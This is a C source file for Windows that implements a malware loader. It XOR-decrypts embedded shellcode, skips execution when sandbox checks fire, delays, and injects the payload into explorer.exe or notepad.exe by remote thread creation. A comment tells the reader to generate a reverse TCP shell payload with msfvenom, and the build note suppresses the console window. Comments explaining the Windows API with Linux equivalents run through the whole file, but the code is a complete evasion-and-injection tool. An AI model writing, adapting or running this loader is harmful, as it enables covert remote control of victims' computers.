#include <windows.h>   // [WINDOWS] - entire Windows API lives here
#include <psapi.h>     // [WINDOWS] - process enumeration functions
#include <stdio.h>     // [STANDARD C] - you know this one

// ─────────────────────────────────────────────
// CONSTANTS

// obtain this shellcode and turns it into constant by using msfvenom
// msfvenom -p windows/multi/reversed_tcp LHOST=ip LPORT=port -f c --veraible_name=name_of_this_constant
// ─────────────────────────────────────────────

#define XOR_KEY 0xAB   // [STANDARD C] - plain preprocessor define

unsigned char enc_shellcode[] = { /* your XOR encoded bytes */ };
SIZE_T shellcode_len = sizeof(enc_shellcode);
// SIZE_T [WINDOWS] - Windows typedef for size_t, basically the same
//                    but sized for the target architecture (32/64bit)


// ─────────────────────────────────────────────
// SHELLCODE DECRYPTION
// ─────────────────────────────────────────────

void decryptShellcode(unsigned char *buf, SIZE_T len) {
    // [STANDARD C] - plain loop and XOR, nothing Windows specific
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= XOR_KEY;
    }
}


// ─────────────────────────────────────────────
// SANDBOX DETECTION
// ─────────────────────────────────────────────

int isSandbox() {

    // --- Check 1: process count ---
    DWORD pids[1024], needed;
    // DWORD [WINDOWS] - typedef for unsigned long (32bit)
    //                   you'll see this everywhere in Windows API

    EnumProcesses(pids, sizeof(pids), &needed);
    // EnumProcesses() [WINDOWS] - fills array with all running process IDs
    //                             no Linux equivalent, closest is reading /proc/
    // 'needed' returns how many bytes were written to the array
    // divide by sizeof(DWORD) to get actual process count

    if ((needed / sizeof(DWORD)) < 30) return 1;


    // --- Check 2: system uptime ---
    if (GetTickCount64() < 300000) return 1;
    // GetTickCount64() [WINDOWS] - milliseconds since system boot
    //                              Linux equivalent: clock_gettime(CLOCK_BOOTTIME)
    // 300000ms = 5 minutes, sandboxes are freshly booted


    // --- Check 3: screen resolution ---
    if (GetSystemMetrics(SM_CXSCREEN) < 800) return 1;
    // GetSystemMetrics() [WINDOWS] - queries system display/UI measurements
    //                                no direct Linux equivalent
    // SM_CXSCREEN = width of screen in pixels
    // sandboxes often run headless or tiny resolution


    // --- Check 4: RAM amount ---
    MEMORYSTATUSEX ms = { sizeof(ms) };
    // MEMORYSTATUSEX [WINDOWS] - struct that holds memory info
    //                            must initialize dwLength = sizeof(struct)
    //                            before calling, Windows requirement

    GlobalMemoryStatusEx(&ms);
    // GlobalMemoryStatusEx() [WINDOWS] - fills MEMORYSTATUSEX with RAM info
    //                                    Linux equivalent: sysinfo() or /proc/meminfo

    if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return 1;
    // ullTotalPhys = total physical RAM in bytes
    // 2ULL * 1024^3 = 2GB, sandboxes often have minimal RAM

    return 0;
}


// ─────────────────────────────────────────────
// FIND TARGET PROCESS BY NAME
// ─────────────────────────────────────────────

DWORD findProcess(const char *procName) {
    DWORD pids[1024], needed;
    EnumProcesses(pids, sizeof(pids), &needed);
    int count = needed / sizeof(DWORD);

    for (int i = 0; i < count; i++) {

        HANDLE h = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            FALSE, pids[i]
        );
        // HANDLE [WINDOWS] - generic handle type, like a file descriptor in Linux
        //                    represents an open reference to a kernel object
        // OpenProcess() [WINDOWS] - opens a handle to another running process
        //                           like opening a file but for a process
        //                           Linux equivalent: just open /proc/PID/
        // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ = access flags
        //   saying what we want to do with this process handle
        // FALSE = don't inherit handle to child processes

        if (!h) continue;   // [STANDARD C] - skip if open failed

        char name[256] = {0};   // [STANDARD C] - plain char buffer
        HMODULE mod;
        // HMODULE [WINDOWS] - handle specifically for a loaded module (DLL/EXE)
        //                     a more specific type of HANDLE

        DWORD cb;
        if (EnumProcessModules(h, &mod, sizeof(mod), &cb)) {
            // EnumProcessModules() [WINDOWS] - gets list of DLLs/EXE loaded
            //                                  in a process
            //                                  Linux equivalent: /proc/PID/maps

            GetModuleBaseNameA(h, mod, name, sizeof(name));
            // GetModuleBaseNameA() [WINDOWS] - gets the filename of a loaded module
            //                                  the 'A' suffix = ANSI (char) version
            //                                  'W' suffix = wide char (wchar_t) version
            //                                  you'll see A/W variants everywhere
        }

        CloseHandle(h);
        // CloseHandle() [WINDOWS] - release a handle when done
        //                           like fclose() but for any kernel object
        //                           Linux equivalent: close()

        if (_stricmp(name, procName) == 0) return pids[i];
        // _stricmp() [WINDOWS] - case insensitive string compare
        //                        Linux equivalent: strcasecmp()
        //                        standard C only has strcmp() (case sensitive)
    }
    return 0;
}


// ─────────────────────────────────────────────
// INJECT SHELLCODE INTO TARGET PROCESS
// ─────────────────────────────────────────────

int injectIntoProcess(DWORD pid, unsigned char *buf, SIZE_T len) {

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    // PROCESS_ALL_ACCESS [WINDOWS] - request all possible permissions
    //                                on this process handle
    if (!hProc) return 0;


    LPVOID mem = VirtualAllocEx(hProc, NULL, len,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_READWRITE);
    // LPVOID [WINDOWS] - typedef for void* (Long Pointer to VOID)
    //                    you can treat it exactly like void* in standard C
    // VirtualAllocEx() [WINDOWS] - allocate memory inside ANOTHER process
    //                              'Ex' = extended (takes process handle)
    //                              VirtualAlloc() without Ex = your own process
    //                              NO Linux equivalent - Linux uses ptrace for this
    // NULL = let Windows choose the address
    // MEM_COMMIT | MEM_RESERVE = actually back with physical memory immediately
    // PAGE_READWRITE = memory is readable and writable, NOT executable yet

    if (!mem) { CloseHandle(hProc); return 0; }


    WriteProcessMemory(hProc, mem, buf, len, NULL);
    // WriteProcessMemory() [WINDOWS] - write bytes into another process memory
    //                                  Linux equivalent: process_vm_writev()
    //                                  or writing to /proc/PID/mem


    DWORD old;
    VirtualProtectEx(hProc, mem, len, PAGE_EXECUTE_READ, &old);
    // VirtualProtectEx() [WINDOWS] - change memory permissions in another process
    //                                Linux equivalent: mprotect() but for remote process
    // PAGE_EXECUTE_READ = now mark as executable but no longer writable
    // old = saves previous permissions (required parameter, we dont use it)
    // this RW → RX two step is less suspicious than allocating RWX directly


    HANDLE hThread = CreateRemoteThread(
        hProc,    // target process
        NULL,     // default security attributes
        0,        // default stack size
        (LPTHREAD_START_ROUTINE)mem,  // start address = our shellcode
        NULL,     // no parameter to pass
        0,        // run immediately
        NULL      // dont need thread ID back
    );
    // CreateRemoteThread() [WINDOWS] - create a new thread inside another process
    //                                  pointing at our injected shellcode
    //                                  Linux has no direct equivalent
    // LPTHREAD_START_ROUTINE [WINDOWS] - function pointer typedef for thread entry
    //                                    basically: DWORD (*)(LPVOID)
    //                                    we cast our memory address to this type


    WaitForSingleObject(hThread, INFINITE);
    // WaitForSingleObject() [WINDOWS] - block until a handle signals completion
    //                                   Linux equivalent: pthread_join() for threads
    //                                   but this works for any kernel object
    // INFINITE [WINDOWS] - defined as 0xFFFFFFFF, wait forever

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 1;
}


// ─────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────

int main() {

    if (isSandbox()) return 0;   // [STANDARD C] - plain function call

    Sleep(10000);
    // Sleep() [WINDOWS] - pause execution for milliseconds
    //                     Linux equivalent: sleep() in seconds
    //                     or usleep() in microseconds
    //                     or nanosleep() for nanoseconds

    decryptShellcode(enc_shellcode, shellcode_len);   // [STANDARD C logic]

    DWORD pid = findProcess("explorer.exe");
    if (!pid) pid = findProcess("notepad.exe");
    if (!pid) return 0;

    injectIntoProcess(pid, enc_shellcode, shellcode_len);

    return 0;   // [STANDARD C]
}



//compile with  -lws2_32 -lpsapi -mwindows library so no pop out windows
